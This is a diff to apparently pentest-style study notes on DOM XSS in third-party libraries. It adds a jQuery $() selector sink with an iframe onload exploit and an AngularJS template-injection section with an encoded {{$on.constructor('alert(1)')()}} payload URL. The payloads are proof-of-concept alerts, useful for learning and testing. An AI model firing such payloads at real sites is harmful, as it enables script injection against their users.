@@ -99,7 +99,7 @@ Exploit
 
 ### <mark style="color:yellow;">DOM XSS - Sources and sinks in third-party dependencies</mark>
 
-### <mark style="color:yellow;">**in jQuery**</mark>
+### <mark style="color:yellow;">**jQuery**</mark>
 
 jQuery's `attr()` function can change the attributes of DOM elements
 
@@ -113,6 +113,74 @@ Exploit
 
 ```
 ?returnUrl=javascript:alert(document.domain)
+```
+
+jQuery's `$()` selector function in another potential sink. If you open the browser console and type `$('<img src=x onerror=alert()>')` jQuery creates this new element (so the alert will be shown)
+
+An example:
+
+```javascript
+$(window).on('hashchange', function() {
+	var element = $(location.hash);
+	element[0].scrollIntoView();
+});
+```
+
+Exploit
+
+```html
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
+
+{% hint style="info" %}
+**Note**: Recent versions of jQuery have patched this specific vulnerability by preventing HTML injection into a selector if the input begins with a hash (#). But remember, this is just an example, the real problem is how `$()` selector works .
+{% endhint %}
+
+### <mark style="color:yellow;">AngularJS</mark>
+
+When a site uses the `ng-app` attribute on an HTML element, AngularJS processes it and executes JavaScript inside double curly braces `{{ }}` in HTML or attributes.
+
+Consider
+
+```
+https://example.com/?search=test
+```
+
+```html
+<body ng-app>
+<!-- something -->
+<h1>0 search results for 'test'</h1>
+<!-- something -->
+</body>
+```
+
+Test
+
+```sh
+https://example.com/?search=%7B%7B1%2B1%7D%7D # ?search={{1+1}}
+```
+
+```html
+<body ng-app>
+<!-- something -->
+<h1>0 search results for '2'</h1>
+<!-- something -->
+</body>
+```
+
+Exploit
+
+```sh
+https://example.comnet/?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D
+# ?search={{$on.constructor('alert(1)')()}}
+```
+
+```html
+<body ng-app>
+<!-- something -->
+<h1>0 search results for ''</h1>
+<!-- something -->
+</body>
 ```
 
 ### <mark style="color:yellow;">Reflected/Stored DOM XSS</mark>
@@ -245,10 +313,6 @@ var input = `controllable data here`;
 </script>
 ${alert(document.domain)}
 ```
-
-### <mark style="color:yellow;">Via client-side template injection</mark>
-
-To do
 
 ## <mark style="color:yellow;">Exploitation</mark>
 
